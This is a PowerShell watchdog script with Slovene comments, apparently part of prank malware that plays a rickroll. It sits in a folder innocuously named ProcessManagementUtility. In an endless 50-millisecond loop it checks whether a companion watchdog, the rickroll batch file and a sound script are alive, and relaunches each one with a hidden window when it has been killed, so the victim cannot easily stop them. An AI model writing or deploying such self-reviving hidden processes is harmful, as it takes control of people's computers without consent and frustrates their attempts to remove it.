Set-Location -Path "$HOME\ProcessManagementUtility\"
./getPID.bat > wd1pid.txt
while ($true) {
    #! WATCHDOG0
    $wd0pid = Get-Content wd0pid.txt
    $wd0pid = $wd0pid.Trim()    # odstrani kere koli presledke ali tabulatorje
    $wd0proc = Get-Process -Id $wd0pid -ErrorAction SilentlyContinue    # proba, ce je watchdog0 se ziv
    if ($wd0proc -eq $null) {   # ce proces ne obstaja
        Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './watchdog0.ps1'"
    }
    #! RICKROLL
    $rrpid = Get-Content rrpid.txt
    $rrpid = $rrpid.Trim()    # odstrani kere koli presledke ali tabulatorje
    $rrproc = Get-Process -Id $rrpid -ErrorAction SilentlyContinue    # proba, ce je rickroll se ziv
    if ($rrproc -eq $null) {   # ce proces ne obstaja
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b rickroll.bat"
    }
    #! SOUND
    $spid = Get-Content spid.txt
    $spid = $spid.Trim()    # odstrani kere koli presledke ali tabulatorje
    $sproc = Get-Process -Id $spid -ErrorAction SilentlyContinue    # proba, ce je sound se ziv
    if ($sproc -eq $null) {   # ce proces ne obstaja
        Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './sound.ps1'"
    }
    #! DELAY DA NI PREVEC ZA PROCESOR
    Start-Sleep -Milliseconds 50
}